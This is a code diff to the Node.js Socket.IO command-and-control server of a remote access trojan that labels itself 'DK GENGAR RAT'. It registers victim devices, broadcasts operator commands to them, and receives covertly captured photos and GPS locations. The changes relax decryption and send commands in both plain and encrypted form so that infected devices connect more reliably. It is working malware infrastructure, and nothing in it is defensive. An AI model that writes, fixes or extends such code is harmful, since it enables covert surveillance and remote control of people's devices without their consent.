@@ -53,61 +53,56 @@ app.get("/health", (req, res) => {
 io.on("connection", (socket) => {
     console.log(`[SISTEMA] Nova conexão: ${socket.id}`);
 
-    socket.on("register", (encryptedData) => {
-        console.log(`[SISTEMA] Recebido evento de registro de ${socket.id}`);
-        const decrypted = decrypt(encryptedData);
-        if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log(`[REGISTRO SUCESSO] Dispositivo: ${data.model} | OS: ${data.os}`);
-                socket.deviceData = data;
-                io.emit("new_device", data);
-            } catch (e) {
-                console.error("[ERRO JSON] Falha ao processar JSON de registro:", e.message);
+    // Registro simplificado para garantir que o dispositivo apareça
+    socket.on("register", (data) => {
+        try {
+            // Se for string, tenta descriptografar. Se for objeto, usa direto.
+            let finalData = data;
+            if (typeof data === 'string') {
+                const decrypted = decrypt(data);
+                if (decrypted) finalData = JSON.parse(decrypted);
+                else finalData = JSON.parse(data); // Tenta JSON puro
             }
-        } else {
-            console.error("[ERRO REGISTRO] Falha ao descriptografar dados de registro de " + socket.id);
+            
+            console.log(`[REGISTRO] Dispositivo: ${finalData.model} | OS: ${finalData.os}`);
+            socket.deviceData = finalData;
+            io.emit("new_device", finalData);
+        } catch (e) {
+            console.error("[ERRO REGISTRO]", e.message);
         }
     });
 
     socket.on("command", (data) => {
-        console.log(`[COMANDO] ${data.cmd} enviado para os dispositivos`);
+        console.log(`[COMANDO] ${data.cmd} enviado`);
+        // Envia comando em texto plano e criptografado para compatibilidade total
         const encryptedCmd = encrypt(JSON.stringify(data));
-        socket.broadcast.emit("command", encryptedCmd);
+        socket.broadcast.emit("command", {
+            plain: data,
+            encrypted: encryptedCmd
+        });
     });
 
     socket.on("result", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
-        if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log(`[RESULTADO] ${data.msg}`);
-                io.emit("server_log", data.msg);
-            } catch (e) {}
-        }
+        const finalMsg = decrypted ? JSON.parse(decrypted).msg : (typeof encryptedData === 'string' ? encryptedData : JSON.stringify(encryptedData));
+        io.emit("server_log", finalMsg);
     });
 
     socket.on("photo_captured", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log("[MÍDIA] Foto recebida");
-                io.emit("display_photo", data.image);
-                io.emit("server_log", "📸 Foto recebida com sucesso!");
-            } catch (e) {}
+            const data = JSON.parse(decrypted);
+            io.emit("display_photo", data.image);
+            io.emit("server_log", "📸 Foto recebida!");
         }
     });
 
     socket.on("location_received", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            try {
-                const data = JSON.parse(decrypted);
-                console.log(`[GPS] Lat: ${data.lat}, Lon: ${data.lon}`);
-                io.emit("display_location", data);
-                io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
-            } catch (e) {}
+            const data = JSON.parse(decrypted);
+            io.emit("display_location", data);
+            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
         }
     });
 
@@ -118,5 +113,5 @@ io.on("connection", (socket) => {
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(`DK GENGAR RAT V1.6.1 rodando na porta ${PORT}`);
+    console.log(`DK GENGAR RAT V1.6.2 rodando na porta ${PORT}`);
 });
